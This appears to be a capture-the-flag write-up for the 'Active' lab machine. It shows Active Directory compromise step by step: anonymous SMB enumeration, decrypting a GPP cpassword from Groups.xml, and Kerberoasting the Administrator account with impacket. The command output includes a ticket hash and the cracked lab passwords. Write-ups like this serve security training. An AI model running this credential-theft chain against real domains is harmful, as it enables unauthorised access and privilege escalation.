## NMAP SCAN
```
nmap -sSCV -p- 10.129.208.110
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-20 21:27 +0700
Nmap scan report for 10.129.208.110
Host is up (0.081s latency).
Not shown: 65513 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-20 14:28:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -24s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-20T14:29:48
|_  start_date: 2026-04-20T14:26:17

```

active.htb 
windows_server_2008:r2:sp1

lets enum smb 
```
smbclient -L //10.129.208.110 
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.208.110 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
smb able to authorize without username and pass

```
netexec smb 10.129.208.110 -u '' -p '' --shares
SMB         10.129.208.110  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.208.110  445    DC               [+] active.htb\: 
SMB         10.129.208.110  445    DC               [*] Enumerated shares
SMB         10.129.208.110  445    DC               Share           Permissions     Remark
SMB         10.129.208.110  445    DC               -----           -----------     ------
SMB         10.129.208.110  445    DC               ADMIN$                          Remote Admin
SMB         10.129.208.110  445    DC               C$                              Default share
SMB         10.129.208.110  445    DC               IPC$                            Remote IPC
SMB         10.129.208.110  445    DC               NETLOGON                        Logon server share 
SMB         10.129.208.110  445    DC               Replication     READ            
SMB         10.129.208.110  445    DC               SYSVOL                          Logon server share 
SMB         10.129.208.110  445    DC               Users                    
```

not able to access further in folders, lets try netexec...
```
netexec smb 10.129.208.110 -u '' -p '' -M spider_plus
SMB         10.129.208.110  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.208.110  445    DC               [+] active.htb\: 
SPIDER_PLUS 10.129.208.110  445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.208.110  445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.208.110  445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.208.110  445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.208.110  445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.208.110  445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.208.110  445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.208.110  445    DC               [*] Enumerated shares
SMB         10.129.208.110  445    DC               Share           Permissions     Remark
SMB         10.129.208.110  445    DC               -----           -----------     ------
SMB         10.129.208.110  445    DC               ADMIN$                          Remote Admin
SMB         10.129.208.110  445    DC               C$                              Default share
SMB         10.129.208.110  445    DC               IPC$                            Remote IPC
SMB         10.129.208.110  445    DC               NETLOGON                        Logon server share 
SMB         10.129.208.110  445    DC               Replication     READ            
SMB         10.129.208.110  445    DC               SYSVOL                          Logon server share 
SMB         10.129.208.110  445    DC               Users                           
SPIDER_PLUS 10.129.208.110  445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.208.110.json".
SPIDER_PLUS 10.129.208.110  445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.129.208.110  445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_PLUS 10.129.208.110  445    DC               [*] Total folders found:  22
SPIDER_PLUS 10.129.208.110  445    DC               [*] Total files found:    7
SPIDER_PLUS 10.129.208.110  445    DC               [*] File size average:    1.16 KB
SPIDER_PLUS 10.129.208.110  445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.208.110  445    DC               [*] File size max:        3.63 KB
```

Found groups.xml file
```
cat 10.129.208.110.json                    
{
    "Replication": {
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 17:37:44",
            "ctime_epoch": "2018-07-21 17:37:44",
            "mtime_epoch": "2018-07-21 17:38:11",
            "size": "23 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
            "atime_epoch": "2018-07-21 17:37:44",
            "ctime_epoch": "2018-07-21 17:37:44",
            "mtime_epoch": "2018-07-21 17:38:11",
            "size": "119 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 17:37:44",
            "ctime_epoch": "2018-07-21 17:37:44",
            "mtime_epoch": "2018-07-21 17:38:11",
            "size": "1.07 KB"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
            "atime_epoch": "2018-07-21 17:37:44",
            "ctime_epoch": "2018-07-21 17:37:44",
            "mtime_epoch": "2018-07-21 17:38:11",
            "size": "533 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2018-07-21 17:37:44",
            "ctime_epoch": "2018-07-21 17:37:44",
            "mtime_epoch": "2018-07-21 17:38:11",
            "size": "2.72 KB"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 17:37:44",
            "ctime_epoch": "2018-07-21 17:37:44",
            "mtime_epoch": "2018-07-21 17:38:11",
            "size": "22 B"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 17:37:44",
            "ctime_epoch": "2018-07-21 17:37:44",
            "mtime_epoch": "2018-07-21 17:38:11",
            "size": "3.63 KB"
        }
    }
}                      
```

lets download it 
```
smbclient //10.129.208.110/Replication -N -c 'get "active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml" Groups.xml'

Anonymous login successful
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
```

```
cat Groups.xml         
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```

seems like there is a user SVC_TGS... 
lets decrypt the cpassword

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

lets try to connect using smbclient..
```
smbclient \\\\10.129.208.110\\Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k18'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 21:39:20 2018
  ..                                 DR        0  Sat Jul 21 21:39:20 2018
  Administrator                       D        0  Mon Jul 16 17:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 12:06:44 2009
  Default                           DHR        0  Tue Jul 14 13:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 12:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 11:57:55 2009
  Public                             DR        0  Tue Jul 14 11:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 22:16:32 2018

                10459647 blocks of size 4096. 5203630 blocks available
smb: \> cd SVC_TGS\
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 22:16:32 2018
  ..                                  D        0  Sat Jul 21 22:16:32 2018
  Contacts                            D        0  Sat Jul 21 22:14:11 2018
  Desktop                             D        0  Sat Jul 21 22:14:42 2018
  Downloads                           D        0  Sat Jul 21 22:14:23 2018
  Favorites                           D        0  Sat Jul 21 22:14:44 2018
  Links                               D        0  Sat Jul 21 22:14:57 2018
  My Documents                        D        0  Sat Jul 21 22:15:03 2018
  My Music                            D        0  Sat Jul 21 22:15:32 2018
  My Pictures                         D        0  Sat Jul 21 22:15:43 2018
  My Videos                           D        0  Sat Jul 21 22:15:53 2018
  Saved Games                         D        0  Sat Jul 21 22:16:12 2018
  Searches                            D        0  Sat Jul 21 22:16:24 2018

                10459647 blocks of size 4096. 5203630 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 22:14:42 2018
  ..                                  D        0  Sat Jul 21 22:14:42 2018
  user.txt                           AR       34  Mon Apr 20 21:27:13 2026

                10459647 blocks of size 4096. 5203630 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

Got user flag
lets try to get tgs

```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.208.110 -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 02:06:40.351723  2026-04-20 21:27:18.481340             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$3b3bf17d4dfb622f06321e16c23474b6$deaf36f193da5388ce20c204d0d6e49a8d66cfceca819a64b12b6ede3c28fec7284559ee2e6a15d86c9ac7c83dc23627328ce75f981a1394e666d8eb61b2d8e7e674b4d3cd7a2d61989df151e45935f55407954e51427735f1ac4d9701d2833f1723f6bbb95841ac191c188e3d1f3a595141d2c533d5f167935cadce639263387164d45f53a8a37e6203a1e053710998e7cb2ef56e2596553278ce1496fc212f10f8ce49d9b97da26d95c15790c74820a788963c9b8d4d59ebf5c0e3abd204334da273431eab987690a14ff5321ad4e6f17904984d348606175e111335e6692ac391abae25340277e0be68b50bb775e2cf8168f0d9974bea8252f725fb7a71e665391bfa9518378d9d39a3764a2b659b0050f4e497b22a76442f9bbdf8a9174a0f22d7d581b025a60dba92c4e86493c8d3f44eda2f5604e0fdfa10bc421f9794ab55993856ea0cdda4dd8526f41a0559d17747808d0e616c87c1b8479d73f931ec413d596ee0f029b8b6991baa0196372ffd0a527e46e53f9e99301b429b969da8fdaaa9ffb1b4e44429d852ebcc7a2223d8ac399fc5d643c020bbae7327256dbe1c299459b11e4aa08fa2159c0de8490316e66883c47fb987d0a585efd0fb0f59c4d383fd967b6ae419d64ede04ccf076ed17f89fdbbe73a6b841e71408801b1decb25c3621ffdb21ee4a8cfaf43720d05dd7e6951c849c7979171ee45f029c4da9f7ff317cd9f849d3760c19eeea242bafc5038395ddc029bc8cd0d708a2747d345db4a97641d962f7547a01ce28c3907e16b3d606df478bc642aeff989c66de767ad31b719208e864ebb643e395ef877bbefb888de30d7f7889692ffd1ae6bc27bfcdb0ca362235e08baff53e6c1258d29ec16bdd9bb1ec2e695fb940751c2b564666da30c8eb1a5b1f19f001fbcd81e4b2b8f541ff0d0011f204a275a7d977ba48a05ff1f1fe59a350067f0476bd46d74f6db1608539252f193a8c8ccd30004899a73ba6015e1f1bc1f1d08fb56b2722579fd82db7419d05a9fd936cee106e456ca5f5ef1494c44d638c07cca755f94197002d248f3d4cf4c8718f438ab18b899f637cc6691e5a63c623131934e6654a05e6e66fb2ed0df297a3c5dbbe8929d2b9ea682362c77f036d588c4ffca8a34aaa5c954e997132c11e3a916295a0a358746bd5bf8d009ec261f641fa6a4d699059e3b976ea6f134929af705dd98240f6b8267cb36984950dadd10b2e365f8c1de108bf395c3853ab
```

password is Administrator:Ticketmaster1968
lets try to connect to smb again and get root flag